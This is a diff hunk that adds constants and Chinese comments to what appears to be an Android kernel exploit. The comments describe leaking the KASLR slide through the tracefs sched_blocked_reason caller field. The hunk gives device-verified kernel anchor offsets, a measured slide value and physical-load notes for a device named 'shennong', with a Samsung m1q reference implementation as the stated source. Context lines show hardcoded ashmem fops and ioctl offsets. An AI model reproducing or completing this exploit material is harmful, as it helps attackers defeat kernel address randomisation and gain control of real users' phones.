@@ -16,6 +16,27 @@
 
 #define PSELECT_WAITER_WORD_SHIFT 3
 
+/* ==== KASLR slide 主路线: tracefs sched_blocked_reason caller 泄漏 ====
+ * (方法源自 S26/m1q 参考实现;shennong 真机已交叉验证:
+ *   worker_thread caller=0xffffffd06fcda4ac,锚点 0xffffffc0080da4ac
+ *   rcu caller        =0xffffffd06fd67b44,锚点 0xffffffc008167b44
+ *   两者推出同一 slide=0x1067C00000,2MB 对齐)
+ * 事件触发条件: CPU rq 空 + 任务阻塞;空闲 kworker 阻塞点 =
+ * worker_thread 内 `bl schedule` 之后那条指令(编译期固定偏移)。
+ * caller 字段来自 __schedule() 经 stack_trace_save_tsk 保存的返回 PC。 */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0da4acULL /* √ 实机验证锚点偏移 */
+#define SLIDE_TRACEFS_RCU_CALLER_OFF 0x167b44ULL /* √ 实机验证锚点偏移(交叉验证用) */
+#define SLIDE_TRACEFS_MAX_SLIDE 0x2000000000ULL /* 128GB;实机 slide≈0x1067c00000 */
+#define SLIDE_TRACEFS_ALIGN 0x10000ULL /* 64KB 对齐过滤;实机 slide 2MB 对齐 */
+
+/* 线性别名是否随 KASLR slide 平移(物理加载是否随机化):
+ * shennong = 0 —— 物理加载固定 0xa8000000(init_task 线性别名
+ * 0xffffff80a9fef600 实测无偏),VA slide(0x1067c00000)只平移 image VA,
+ * 不影响 PAGE_OFFSET 线性映射;三星 m1q 的 P0 别名在 image 映射区
+ * (0xffffffc0...),随 slide 平移,故其 slide_p0_offset = slide。
+ * 排查时可用环境变量 SLIDE_P0_OFFSET 强制覆盖。 */
+#define SLIDE_P0_OFFSET 0x0ULL
+
 #define ASHMEM_MISC_FOPS_OFF 0x0214bec0ULL
 #define ASHMEM_FOPS_OFF 0x0126d7b8ULL
 #define ASHMEM_IOCTL_OFF 0x00c2daa4ULL
